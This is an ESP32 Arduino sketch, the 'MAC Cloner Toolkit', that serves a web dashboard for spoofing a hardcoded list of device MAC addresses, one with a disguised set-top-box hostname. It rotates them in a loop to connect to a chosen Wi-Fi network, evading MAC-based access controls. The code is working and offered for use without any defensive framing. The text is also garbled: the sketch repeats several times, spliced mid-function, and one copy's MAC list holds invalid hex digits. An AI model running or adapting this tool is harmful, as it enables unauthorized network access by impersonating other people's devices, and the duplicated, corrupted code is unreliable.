#include <WiFi.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include <Preferences.h>

const char* ap_ssid = "ESP32_Toolkit";
const char* ap_pass = "12345678";

WebServer server(80);
Preferences preferences;

String scanResultsHTML = "";

enum SystemState { STATE_IDLE, STATE_CLONING, STATE_COOLING, STATE_ENERGY_SAVER };
SystemState currentState = STATE_IDLE;

String targetSSID = "";
String targetPass = "";
String selectedMacList = "";
String originalMacList = "";
int holdDuration = 5;
bool infiniteLoopEnabled = false;
uint8_t globalApMac[6];
int globalChannel = 1;

unsigned long sessionStartTime = 0;
unsigned long coolingStartTime = 0;
const unsigned long ACTIVE_LIMIT_MS = 3600000UL; 
const unsigned long COOLING_DURATION_MS = 600000UL; 

bool parseMacAddress(const char* macStr, uint8_t* macarray) {
  int values[6];
  if (sscanf(macStr, "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) == 6) {
    for (int i = 0; i < 6; ++i) {
      macarray[i] = (uint8_t)values[i];
    }
    return true;
  }
  return false;
}

bool isTargetNetworkAvailable() {
  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; ++i) {
    if (WiFi.SSID(i) == targetSSID) {
      parseMacAddress(WiFi.BSSIDstr(i).c_str(), globalApMac);
      globalChannel = WiFi.channel(i);
      return true;
    }
  }
  return false;
}

void handleRoot() {
  preferences.begin("esp-store", true);
  String savedSsid = preferences.getString("saved_ssid", "");
  String savedPass = preferences.getString("saved_pass", "");
  preferences.end();

  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>";
  html += "body { background-color: #0f172a; color: #f8fafc; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px; margin: 0; }";
  html += ".container { max-width: 600px; margin: auto; background: #1e293b; padding: 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); border: 1px solid #334155; }";
  html += "h2 { color: #38bdf8; text-align: center; margin-bottom: 5px; }";
  html += ".author { text-align: center; color: #94a3b8; font-size: 14px; margin-bottom: 25px; }";
  html += ".card { background: #0f172a; border: 1px solid #334155; padding: 20px; border-radius: 8px; margin-bottom: 20px; }";
  html += "h3 { color: #f1f5f9; margin-top: 0; font-size: 18px; border-bottom: 1px solid #334155; padding-bottom: 8px; }";
  html += "input[type='text'], input[type='password'], input[type='number'], textarea { width: 100%; box-sizing: border-box; padding: 10px; margin-top: 6px; margin-bottom: 15px; background: #1e293b; border: 1px solid #475569; color: #fff; border-radius: 6px; }";
  html += "input[type='submit'] { background: #0ea5e9; color: white; border: none; padding: 12px 20px; font-weight: bold; border-radius: 6px; cursor: pointer; width: 100%; transition: background 0.2s; }";
  html += "input[type='submit']:hover { background: #0284c7; }";
  html += ".btn-secondary { background: #334155; margin-top: 8px; }";
  html += ".btn-secondary:hover { background: #475569; }";
  html += "label { display: block; margin-bottom: 8px; font-size: 14px; color: #cbd5e1; cursor: pointer; }";
  html += "ul { padding-left: 20px; }";
  html += "li { margin-bottom: 8px; font-size: 14px; }";
  html += "a { color: #38bdf8; text-decoration: none; }";
  html += "a:hover { text-decoration: underline; }";
  html += "</style></head><body>";
  
  html += "<div class='container'>";
  html += "<h2>ESP32 MAC Cloner Toolkit</h2>";
  html += "<div class='author'>By Asif</div>";

  html += "<div class='card'>";
  html += "<h3>Manage Permanent Target</h3>";
  html += "<form action='/save_target' method='POST'>";
  html += "<label>Permanent Target SSID:</label><input type='text' name='perm_ssid' value='" + savedSsid + "'>";
  html += "<label>Permanent Target Password:</label><input type='password' name='perm_pass' value='" + savedPass + "'>";
  html += "<input type='submit' value='Save Target Permanently'>";
  html += "</form>";
  html += "<form action='/clear_target' method='POST' style='margin-top:10px;'>";
  html += "<input type='submit' value='Clear Saved Target' class='btn-secondary'>";
  html += "</form>";
  html += "</div>";

  html += "<div class='card'>";
  html += "<h3>Mode 1: Selective MAC Cloner with Energy Saver</h3>";
  html += "<form action='/start_clone' method='POST'>";
  
  if (savedSsid.length() > 0) {
    html += "<label><input type='checkbox' name='use_saved' value='yes' checked> <b>Use Saved Permanent Target (" + savedSsid + ")</b></label><br>";
  }
  
  html += "<label>Target SSID (if not using saved):</label><input type='text' name='ssid'>";
  html += "<label>Password (blank if open):</label><input type='password' name='pass'>";
  
  html += "<label><b>Select Pre-configured MACs to Clone:</b></label>";
  String defaultMacs[] = {
    "0e:04:1a:9b:92:3f",
    "14:85:54:08:5d:ca",
    "20:51:f5:66:2f:1a",
    "70:1c:e7:a2:e0:c2",
    "e2:41:a9:f2:ee:72",
    "d2:ed:e0:54:d4:80",
    "e4:84:d3:b3:58:2d",
    "12:ea:7c:12:1e:7b"
  };

  for (int i = 0; i < 8; i++) {
    html += "<label><input type='checkbox' name='mac_" + String(i) + "' value='" + defaultMacs[i] + "' checked> " + defaultMacs[i] + "</label>";
  }

  html += "<br><label><b>Add Extra MAC Addresses (One per line):</b></label>";
  html += "<textarea name='extrac_macs' rows='3' placeholder='AA:BB:CC:DD:EE:FF'></textarea>";

  html += "<label>Hold Time per MAC (seconds):</label><input type='number' name='duration' value='10'>";
  
  html += "<label><input type='checkbox' name='loop' value='yes' checked> <b>Enable Infinite Loop</b></label><br>";
  
  html += "<input type='submit' value='Start'>";
  html += "</form></div>";

  html += "<div class='card'>";
  html += "<h3>Mode 2: Wi-Fi Scanner & Open Connect</h3>";
  html += "<form action='/scan' method='GET'><input type='submit' value='Scan Networks'></form>";
  html += scanResultsHTML;
  html += "</div></div></body></html>";

  server.send(200, "text/html", html);
}

void handleSaveTarget() {
  if (server.hasArg("perm_ssid")) {
    preferences.begin("esp-store", false);
    preferences.putString("saved_ssid", server.arg("perm_ssid"));
    preferences.putString("saved_pass", server.arg("perm_pass"));
    preferences.end();
  }
  server.sendHeader("Location", "/", true);
  server.send(303);
}

void handleClearTarget() {
  preferences.begin("esp-store", false);
  preferences.clear();
  preferences.end();
  server.sendHeader("Location", "/", true);
  server.send(303);
}

void handleScan() {
  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks();
  
  scanResultsHTML = "<h4>Found Networks:</h4><ul>";
  for (int i = 0; i < n; ++i) {
    String netSsid = WiFi.SSID(i);
    int enc = WiFi.encryptionType(i);
    scanResultsHTML += "<li><b>" + netSsid + "</b> (" + String(WiFi.RSSI(i)) + " dBm) ";
    if (enc == WIFI_AUTH_OPEN) {
      scanResultsHTML += "<span style='color:#4ade80;'>[OPEN]</span> ";
      scanResultsHTML += "<a href='/open_connect?ssid=" + netSsid + "'>Connect Now</a>";
    } else {
      scanResultsHTML += "<span style='color:#f87171;'>[Secured]</span>";
    }
    scanResultsHTML += "</li>";
  }
  scanResultsHTML += "</ul>";
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid, ap_pass);

  server.sendHeader("Location", "/", true);
  server.send(303);
}

void handleOpenConnect() {
  if (!server.hasArg("ssid")) {
    server.send(400, "text/plain", "SSID missing");
    return;
  }
  String targetSsid = server.arg("ssid");
  server.send(200, "text/html", "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{background:#0f172a;color:#f8fafc;font-family:sans-serif;padding:30px;text-align:center;}a{color:#38bdf8;}</style></head><body><h3>Connecting to open network: " + targetSsid + "</h3><p>Check Serial Monitor.</p><a href='/'>Back</a></body></html>");

  WiFi.mode(WIFI_STA);
  WiFi.begin(targetSsid.c_str(), NULL);
  unsigned long start = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - start < 8000) {
    delay(500);
  }

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\nConnected to Open Network!");
    delay(10000);
    WiFi.disconnect(true);
  }
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid, ap_pass);
}

void handleStartClone() {
  if (server.hasArg("use_saved")) {
    preferences.begin("esp-store", true);
    targetSSID = preferences.getString("saved_ssid", "");
    targetPass = preferences.getString("saved_pass", "");
    preferences.end();
  } else if (server.hasArg("ssid") && server.arg("ssid").length() > 0) {
    targetSSID = server.arg("ssid");
    targetPass = server.hasArg("pass") ? server.arg("pass") : "";
  }

  if (targetSSID.length() == 0) {
    server.send(400, "text/plain", "No Target SSID specified or saved.");
    return;
  }

  holdDuration = server.hasArg("duration") ? server.arg("duration").toInt() : 5;
  infiniteLoopEnabled = server.hasArg("loop");

  selectedMacList = "";
  for (int i = 0; i < 8; i++) {
    String argName = "mac_" + String(i);
    if (server.hasArg(argName)) {
      selectedMacList += server.arg(argName) + "\n";
    }
  }

  if (server.hasArg("extrac_macs")) {
    selectedMacList += server.arg("extrac_macs") + "\n";
  }

  originalMacList = selectedMacList;

  if (!isTargetNetworkAvailable()) {
    Serial.println("\n[INIT] Target network not found initially. Entering Energy Saver state.");
    currentState = STATE_ENERGY_SAVER;
  } else {
    sessionStartTime = millis(); 
    currentState = STATE_CLONING;
  }
  
  server.send(200, "text/html", "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{background:#0f172a;color:#f8fafc;font-family:sans-serif;padding:30px;text-align:center;}a{color:#38bdf8;}</style></head><body><h3>Sequence Initialized with Energy Saver</h3><p>Check Serial Monitor for live execution feedback.</p><a href='/'>Back</a></body></html>");
}

void runCloningStateMachine() {
  if (!isTargetNetworkAvailable()) {
    Serial.println("\n[ENERGY SAVER] Target network went offline/rangeout");
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF); 
    currentState = STATE_ENERGY_SAVER;
    return;
  }

  if (millis() - sessionStartTime >= ACTIVE_LIMIT_MS) {
    Serial.println("\n[RELAX MODE] Active for 1 hour.");
    WiFi.disconnect(true);
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ap_ssid, ap_pass); 
    coolingStartTime = millis();
    currentState = STATE_COOLING;
    return;
  }

  if (selectedMacList.length() == 0 || selectedMacList.indexOf(":") == -1) {
    if (infiniteLoopEnabled) {
      Serial.println("\n--Rotation completed--");
      selectedMacList = originalMacList;
      delay(1000);
      return;
    } else {
      Serial.println("\n--Returned to IDLE--");
      WiFi.mode(WIFI_AP);
      WiFi.softAP(ap_ssid, ap_pass);
      currentState = STATE_IDLE;
      return;
    }
  }

  int endIdx = selectedMacList.indexOf('\n');
  if (endIdx == -1) endIdx = selectedMacList.length();

  String currentMac = selectedMacList.substring(0, endIdx);
  currentMac.trim();
  
  if (endIdx < selectedMacList.length()) {
    selectedMacList = selectedMacList.substring(endIdx + 1);
  } else {
    selectedMacList = "";
  }

  if (currentMac.length() >= 17) {
    uint8_t clientMac[6];
    if (parseMacAddress(currentMac.c_str(), clientMac)) {
      if (!(clientMac[0] & 0x01)) { 
        
        WiFi.disconnect(true);
        WiFi.mode(WIFI_STA);
        delay(50);

        if (currentMac.equalsIgnoreCase("14:85:54:08:5d:ca")) {
          WiFi.setHostname("SetTopBox-4548");
        } else {
          WiFi.setHostname("esp32-device");
        }

        if (esp_wifi_set_mac(WIFI_IF_STA, clientMac) == ESP_OK) {
          Serial.printf("[MAC APPLIED ] -> %s\n", currentMac.c_str());
          
          if (targetPass.length() > 0) {
            WiFi.begin(targetSSID.c_str(), targetPass.c_str());
          } else {
            WiFi.begin(targetSSID.c_str(), NULL);
          }

          unsigned long connectStart = millis();
          bool connected = false;

          while (millis() - connectStart < 6000) {
            if (WiFi.status() == WL_CONNECTED) {
              connected = true;
              break;
            }
            delay(400);
            Serial.print(".");
          }

          if (connected) {
            int randomExtraSec = random(1, 3); 
            int dynamicHoldDuration = holdDuration + randomExtraSec;
            
            Serial.printf("\n[CONNECTED!] Holding Communication for %d seconds (Base: %d + Dynamic Extra: %d)...\n", dynamicHoldDuration, holdDuration, randomExtraSec);
            
            unsigned long holdTimer = millis();
            while (millis() - holdTimer < (dynamicHoldDuration * 1000UL)) {
              yield();
            }
            
            WiFi.disconnect(true);
            Serial.println("[DISCONNECTED]");
          } else {
            Serial.println("\n[TIMEOUT] Connection attempt skipped.");
            WiFi.disconnect(true);
          }
        }
      }
    }
  }
}

void runCoolingStateMachine() {
  if (millis() - coolingStartTime >= COOLING_DURATION_MS) {
    Serial.println("\n[RELAX MODE] Board is cool.");
    selectedMacList = originalMacList; 
    sessionStartTime = millis();      
    currentState = STATE_CLONING;
  } else {
    delay(1000);
  }
}

void runEnergySaverStateMachine() {
  Serial.println("[ENERGY SAVER] Target found offline... ");
  
  if (isTargetNetworkAvailable()) {
    Serial.println("[ENERGY SAVER] Target found online \n Resuming...");
    sessionStartTime = millis();
    currentState = STATE_CLONING;
  } else {
    delay(15000);
  }
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid, ap_pass);

  Serial.println("\n____________________________________________");
  Serial.println("System Ready.");
  Serial.print("Connect to AP: ");
  Serial.println(ap_ssid);
  Serial.println("Dashboard: http://192.168.4.1");
  Serial.println("____________________________________________");

  server.on("/", HTTP_GET, handleRoot);
  server.on("/scan", HTTP_GET, handleScan);
  server.on("/open_connect", HTTP_GET, handleOpenConnect);
  server.on("/start_clone", HTTP_POST, handleStartClone);
  server.on("/save_target", HTTP_POST, handleSaveTarget);
  server.on("/clear_target", HTTP_POST, handleClearTarget);

  server.begin();
}

void loop() {
  if (currentState == STATE_IDLE) {
    server.handleClient();
  } else if (currentState == STATE_CLONING) {
    runCloningStateMachine();
  } else if (currentState == STATE_COOLING) {
    runCoolingStateMachine();
  } else if (currentState == STATE_ENERGY_SAVER) {
    runEnergySaverStateMachine();
  }
  delay(2);
}  preferences.end();

  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>";
  html += "body { background-color: #0f172a; color: #f8fafc; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px; margin: 0; }";
  html += ".container { max-width: 600px; margin: auto; background: #1e293b; padding: 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); border: 1px solid #334155; }";
  html += "h2 { color: #38bdf8; text-align: center; margin-bottom: 5px; }";
  html += ".author { text-align: center; color: #94a3b8; font-size: 14px; margin-bottom: 25px; }";
  html += ".card { background: #0f172a; border: 1px solid #334155; padding: 20px; border-radius: 8px; margin-bottom: 20px; }";
  html += "h3 { color: #f1f5f9; margin-top: 0; font-size: 18px; border-bottom: 1px solid #334155; padding-bottom: 8px; }";
  html += "input[type='text'], input[type='password'], input[type='number'], textarea { width: 100%; box-sizing: border-box; padding: 10px; margin-top: 6px; margin-bottom: 15px; background: #1e293b; border: 1px solid #475569; color: #fff; border-radius: 6px; }";
  html += "input[type='submit'] { background: #0ea5e9; color: white; border: none; padding: 12px 20px; font-weight: bold; border-radius: 6px; cursor: pointer; width: 100%; transition: background 0.2s; }";
  html += "input[type='submit']:hover { background: #0284c7; }";
  html += ".btn-secondary { background: #334155; margin-top: 8px; }";
  html += ".btn-secondary:hover { background: #475569; }";
  html += "label { display: block; margin-bottom: 8px; font-size: 14px; color: #cbd5e1; cursor: pointer; }";
  html += "ul { padding-left: 20px; }";
  html += "li { margin-bottom: 8px; font-size: 14px; }";
  html += "a { color: #38bdf8; text-decoration: none; }";
  html += "a:hover { text-decoration: underline; }";
  html += "</style></head><body>";
  
  html += "<div class='container'>";
  html += "<h2>ESP32 MAC Cloner Toolkit</h2>";
  html += "<div class='author'>By Asif</div>";

  html += "<div class='card'>";
  html += "<h3>Manage Permanent Target</h3>";
  html += "<form action='/save_target' method='POST'>";
  html += "<label>Permanent Target SSID:</label><input type='text' name='perm_ssid' value='" + savedSsid + "'>";
  html += "<label>Permanent Target Password:</label><input type='password' name='perm_pass' value='" + savedPass + "'>";
  html += "<input type='submit' value='Save Target Permanently'>";
  html += "</form>";
  html += "<form action='/clear_target' method='POST' style='margin-top:10px;'>";
  html += "<input type='submit' value='Clear Saved Target' class='btn-secondary'>";
  html += "</form>";
  html += "</div>";

  html += "<div class='card'>";
  html += "<h3>Mode 1: Selective MAC Cloner with Energy Saver</h3>";
  html += "<form action='/start_clone' method='POST'>";
  
  if (savedSsid.length() > 0) {
    html += "<label><input type='checkbox' name='use_saved' value='yes' checked> <b>Use Saved Permanent Target (" + savedSsid + ")</b></label><br>";
  }
  
  html += "<label>Target SSID (if not using saved):</label><input type='text' name='ssid'>";
  html += "<label>Password (blank if open):</label><input type='password' name='pass'>";
  
  html += "<label><b>Select Pre-configured MACs to Clone:</b></label>";
  String defaultMacs[] = {
    "1e:04:1j:9b:92:3f",
    "14:85:54:08:4d:ca",
    "20:51:f5:76:2f:1a",
    "70:1c:e7:a2:e0:c2",
    "e2:41:a9:52:ee:72",
    "d2:ed:e0:ik:d4:80",
    "e4:84:d3:b3:98:2d",
    "12:ea:7c:12:1a:7b"
  };

  for (int i = 0; i < 8; i++) {
    html += "<label><input type='checkbox' name='mac_" + String(i) + "' value='" + defaultMacs[i] + "' checked> " + defaultMacs[i] + "</label>";
  }

  html += "<br><label><b>Add Extra MAC Addresses (One per line):</b></label>";
  html += "<textarea name='extrac_macs' rows='3' placeholder='AA:BB:CC:DD:EE:FF'></textarea>";

  html += "<label>Hold Time per MAC (seconds):</label><input type='number' name='duration' value='10'>";
  
  html += "<label><input type='checkbox' name='loop' value='yes' checked> <b>Enable Infinite Loop</b></label><br>";
  
  html += "<input type='submit' value='Start'>";
  html += "</form></div>";

  html += "<div class='card'>";
  html += "<h3>Mode 2: Wi-Fi Scanner & Open Connect</h3>";
  html += "<form action='/scan' method='GET'><input type='submit' value='Scan Networks'></form>";
  html += scanResultsHTML;
  html += "</div></div></body></html>";

  server.send(200, "text/html", html);
}

void handleSaveTarget() {
  if (server.hasArg("perm_ssid")) {
    preferences.begin("esp-store", false);
    preferences.putString("saved_ssid", server.arg("perm_ssid"));
    preferences.putString("saved_pass", server.arg("perm_pass"));
    preferences.end();
  }
  server.sendHeader("Location", "/", true);
  server.send(303);
}

void handleClearTarget() {
  preferences.begin("esp-store", false);
  preferences.clear();
  preferences.end();
  server.sendHeader("Location", "/", true);
  server.send(303);
}

void handleScan() {
  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks();
  
  scanResultsHTML = "<h4>Found Networks:</h4><ul>";
  for (int i = 0; i < n; ++i) {
    String netSsid = WiFi.SSID(i);
    int enc = WiFi.encryptionType(i);
    scanResultsHTML += "<li><b>" + netSsid + "</b> (" + String(WiFi.RSSI(i)) + " dBm) ";
    if (enc == WIFI_AUTH_OPEN) {
      scanResultsHTML += "<span style='color:#4ade80;'>[OPEN]</span> ";
      scanResultsHTML += "<a href='/open_connect?ssid=" + netSsid + "'>Connect Now</a>";
    } else {
      scanResultsHTML += "<span style='color:#f87171;'>[Secured]</span>";
    }
    scanResultsHTML += "</li>";
  }
  scanResultsHTML += "</ul>";
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid, ap_pass);

  server.sendHeader("Location", "/", true);
  server.send(303);
}

void handleOpenConnect() {
  if (!server.hasArg("ssid")) {
    server.send(400, "text/plain", "SSID missing");
    return;
  }
  String targetSsid = server.arg("ssid");
  server.send(200, "text/html", "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{background:#0f172a;color:#f8fafc;font-family:sans-serif;padding:30px;text-align:center;}a{color:#38bdf8;}</style></head><body><h3>Connecting to open network: " + targetSsid + "</h3><p>Check Serial Monitor.</p><a href='/'>Back</a></body></html>");

  WiFi.mode(WIFI_STA);
  WiFi.begin(targetSsid.c_str(), NULL);
  unsigned long start = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - start < 8000) {
    delay(500);
  }

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\nConnected to Open Network!");
    delay(10000);
    WiFi.disconnect(true);
  }
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid, ap_pass);
}

void handleStartClone() {
  if (server.hasArg("use_saved")) {
    preferences.begin("esp-store", true);
    targetSSID = preferences.getString("saved_ssid", "");
    targetPass = preferences.getString("saved_pass", "");
    preferences.end();
  } else if (server.hasArg("ssid") && server.arg("ssid").length() > 0) {
    targetSSID = server.arg("ssid");
    targetPass = server.hasArg("pass") ? server.arg("pass") : "";
  }

  if (targetSSID.length() == 0) {
    server.send(400, "text/plain", "No Target SSID specified or saved.");
    return;
  }

  holdDuration = server.hasArg("duration") ? server.arg("duration").toInt() : 5;
  infiniteLoopEnabled = server.hasArg("loop");

  selectedMacList = "";
  for (int i = 0; i < 8; i++) {
    String argName = "mac_" + String(i);
    if (server.hasArg(argName)) {
      selectedMacList += server.arg(argName) + "\n";
    }
  }

  if (server.hasArg("extrac_macs")) {
    selectedMacList += server.arg("extrac_macs") + "\n";
  }

  originalMacList = selectedMacList;

  if (!isTargetNetworkAvailable()) {
    Serial.println("\n[INIT] Target network not found initially. Entering Energy Saver state.");
    currentState = STATE_ENERGY_SAVER;
  } else {
    sessionStartTime = millis(); 
    currentState = STATE_CLONING;
  }
  
  server.send(200, "text/html", "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{background:#0f172a;color:#f8fafc;font-family:sans-serif;padding:30px;text-align:center;}a{color:#38bdf8;}</style></head><body><h3>Sequence Initialized with Energy Saver</h3><p>Check Serial Monitor for live execution feedback.</p><a href='/'>Back</a></body></html>");
}

void runCloningStateMachine() {
  if (!isTargetNetworkAvailable()) {
    Serial.println("\n[ENERGY SAVER] Target network went offline/rangeout");
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF); 
    currentState = STATE_ENERGY_SAVER;
    return;
  }

  if (millis() - sessionStartTime >= ACTIVE_LIMIT_MS) {
    Serial.println("\n[RELAX MODE] Active for 1 hour.");
    WiFi.disconnect(true);
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ap_ssid, ap_pass); 
    coolingStartTime = millis();
    currentState = STATE_COOLING;
    return;
  }

  if (selectedMacList.length() == 0 || selectedMacList.indexOf(":") == -1) {
    if (infiniteLoopEnabled) {
      Serial.println("\n--Rotation completed--");
      selectedMacList = originalMacList;
      delay(1000);
      return;
    } else {
      Serial.println("\n--Returned to IDLE--");
      WiFi.mode(WIFI_AP);
      WiFi.softAP(ap_ssid, ap_pass);
      currentState = STATE_IDLE;
      return;
    }
  }

  int endIdx = selectedMacList.indexOf('\n');
  if (endIdx == -1) endIdx = selectedMacList.length();

  String currentMac = selectedMacList.substring(0, endIdx);
  currentMac.trim();
  
  if (endIdx < selectedMacList.length()) {
    selectedMacList = selectedMacList.substring(endIdx + 1);
  } else {
    selectedMacList = "";
  }

  if (currentMac.length() >= 17) {
    uint8_t clientMac[6];
    if (parseMacAddress(currentMac.c_str(), clientMac)) {
      if (!(clientMac[0] & 0x01)) { 
        
        WiFi.disconnect(true);
        WiFi.mode(WIFI_STA);
        delay(50);

        if (currentMac.equalsIgnoreCase("14:85:54:08:5d:ca")) {
          WiFi.setHostname("SetTopBox-4548");
        } else {
          WiFi.setHostname("esp32-device");
        }

        if (esp_wifi_set_mac(WIFI_IF_STA, clientMac) == ESP_OK) {
          Serial.printf("[MAC APPLIED ] -> %s\n", currentMac.c_str());
          
          if (targetPass.length() > 0) {
            WiFi.begin(targetSSID.c_str(), targetPass.c_str());
          } else {
            WiFi.begin(targetSSID.c_str(), NULL);
          }

          unsigned long connectStart = millis();
          bool connected = false;

          while (millis() - connectStart < 6000) {
            if (WiFi.status() == WL_CONNECTED) {
              connected = true;
              break;
            }
            delay(400);
            Serial.print(".");
          }

          if (connected) {
            int randomExtraSec = random(1, 3); 
            int dynamicHoldDuration = holdDuration + randomExtraSec;
            
            Serial.printf("\n[CONNECTED!] Holding Communication for %d seconds (Base: %d + Dynamic Extra: %d)...\n", dynamicHoldDuration, holdDuration, randomExtraSec);
            
            unsigned long holdTimer = millis();
            while (millis() - holdTimer < (dynamicHoldDuration * 1000UL)) {
              yield();
            }
            
            WiFi.disconnect(true);
            Serial.println("[DISCONNECTED]");
          } else {
            Serial.println("\n[TIMEOUT] Connection attempt skipped.");
            WiFi.disconnect(true);
          }
        }
      }
    }
  }
}

void runCoolingStateMachine() {
  if (millis() - coolingStartTime >= COOLING_DURATION_MS) {
    Serial.println("\n[RELAX MODE] Board is cool.");
    selectedMacList = originalMacList; 
    sessionStartTime = millis();      
    currentState = STATE_CLONING;
  } else {
    delay(1000);
  }
}

void runEnergySaverStateMachine() {
  Serial.println("[ENERGY SAVER] Target found offline... ");
  
  if (isTargetNetworkAvailable()) {
    Serial.println("[ENERGY SAVER] Target found online \n Resuming...");
    sessionStartTime = millis();
    currentState = STATE_CLONING;
  } else {
    delay(15000);
  }
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid, ap_pass);

  Serial.println("\n____________________________________________");
  Serial.println("System Ready.");
  Serial.print("Connect to AP: ");
  Serial.println(ap_ssid);
  Serial.println("Dashboard: http://192.168.4.1");
  Serial.println("____________________________________________");

  server.on("/", HTTP_GET, handleRoot);
  server.on("/scan", HTTP_GET, handleScan);
  server.on("/open_connect", HTTP_GET, handleOpenConnect);
  server.on("/start_clone", HTTP_POST, handleStartClone);
  server.on("/save_target", HTTP_POST, handleSaveTarget);
  server.on("/clear_target", HTTP_POST, handleClearTarget);

  server.begin();
}

void loop() {
  if (currentState == STATE_IDLE) {
    server.handleClient();
  } else if (currentState == STATE_CLONING) {
    runCloningStateMachine();
  } else if (currentState == STATE_COOLING) {
    runCoolingStateMachine();
  } else if (currentState == STATE_ENERGY_SAVER) {
    runEnergySaverStateMachine();
  }
  delay(2);
}  html += "<style>";
  html += "body { background-color: #0f172a; color: #f8fafc; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px; margin: 0; }";
  html += ".container { max-width: 600px; margin: auto; background: #1e293b; padding: 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); border: 1px solid #334155; }";
  html += "h2 { color: #38bdf8; text-align: center; margin-bottom: 5px; }";
  html += ".author { text-align: center; color: #94a3b8; font-size: 14px; margin-bottom: 25px; }";
  html += ".card { background: #0f172a; border: 1px solid #334155; padding: 20px; border-radius: 8px; margin-bottom: 20px; }";
  html += "h3 { color: #f1f5f9; margin-top: 0; font-size: 18px; border-bottom: 1px solid #334155; padding-bottom: 8px; }";
  html += "input[type='text'], input[type='password'], input[type='number'], textarea { width: 100%; box-sizing: border-box; padding: 10px; margin-top: 6px; margin-bottom: 15px; background: #1e293b; border: 1px solid #475569; color: #fff; border-radius: 6px; }";
  html += "input[type='submit'] { background: #0ea5e9; color: white; border: none; padding: 12px 20px; font-weight: bold; border-radius: 6px; cursor: pointer; width: 100%; transition: background 0.2s; }";
  html += "input[type='submit']:hover { background: #0284c7; }";
  html += ".btn-secondary { background: #334155; margin-top: 8px; }";
  html += ".btn-secondary:hover { background: #475569; }";
  html += "label { display: block; margin-bottom: 8px; font-size: 14px; color: #cbd5e1; cursor: pointer; }";
  html += "ul { padding-left: 20px; }";
  html += "li { margin-bottom: 8px; font-size: 14px; }";
  html += "a { color: #38bdf8; text-decoration: none; }";
  html += "a:hover { text-decoration: underline; }";
  html += "</style></head><body>";
  
  html += "<div class='container'>";
  html += "<h2>ESP32 MAC Cloner Toolkit</h2>";
  html += "<div class='author'>By Asif</div>";

  html += "<div class='card'>";
  html += "<h3>Manage Permanent Target</h3>";
  html += "<form action='/save_target' method='POST'>";
  html += "<label>Permanent Target SSID:</label><input type='text' name='perm_ssid' value='" + savedSsid + "'>";
  html += "<label>Permanent Target Password:</label><input type='password' name='perm_pass' value='" + savedPass + "'>";
  html += "<input type='submit' value='Save Target Permanently'>";
  html += "</form>";
  html += "<form action='/clear_target' method='POST' style='margin-top:10px;'>";
  html += "<input type='submit' value='Clear Saved Target' class='btn-secondary'>";
  html += "</form>";
  html += "</div>";

  html += "<div class='card'>";
  html += "<h3>Mode 1: Selective MAC Cloner with Energy Saver</h3>";
  html += "<form action='/start_clone' method='POST'>";
  
  if (savedSsid.length() > 0) {
    html += "<label><input type='checkbox' name='use_saved' value='yes' checked> <b>Use Saved Permanent Target (" + savedSsid + ")</b></label><br>";
  }
  
  html += "<label>Target SSID (if not using saved):</label><input type='text' name='ssid'>";
  html += "<label>Password (blank if open):</label><input type='password' name='pass'>";
  
  html += "<label><b>Select Pre-configured MACs to Clone:</b></label>";
  String defaultMacs[] = {
    "0e:04:1a:9b:92:3f",
    "14:85:54:08:5d:ca",
    "20:51:f5:66:2f:1a",
    "70:1c:e7:a2:e0:c2",
    "e2:41:a9:f2:ee:72",
    "d2:ed:e0:54:d4:80",
    "e4:84:d3:b3:58:2d",
    "12:ea:7c:12:1e:7b"
  };

  for (int i = 0; i < 8; i++) {
    html += "<label><input type='checkbox' name='mac_" + String(i) + "' value='" + defaultMacs[i] + "' checked> " + defaultMacs[i] + "</label>";
  }

  html += "<br><label><b>Add Extra MAC Addresses (One per line):</b></label>";
  html += "<textarea name='extrac_macs' rows='3' placeholder='AA:BB:CC:DD:EE:FF'></textarea>";

  html += "<label>Hold Time per MAC (seconds):</label><input type='number' name='duration' value='10'>";
  
  html += "<label><input type='checkbox' name='loop' value='yes' checked> <b>Enable Infinite Loop</b></label><br>";
  
  html += "<input type='submit' value='Start'>";
  html += "</form></div>";

  html += "<div class='card'>";
  html += "<h3>Mode 2: Wi-Fi Scanner & Open Connect</h3>";
  html += "<form action='/scan' method='GET'><input type='submit' value='Scan Networks'></form>";
  html += scanResultsHTML;
  html += "</div></div></body></html>";

  server.send(200, "text/html", html);
}

void handleSaveTarget() {
  if (server.hasArg("perm_ssid")) {
    preferences.begin("esp-store", false);
    preferences.putString("saved_ssid", server.arg("perm_ssid"));
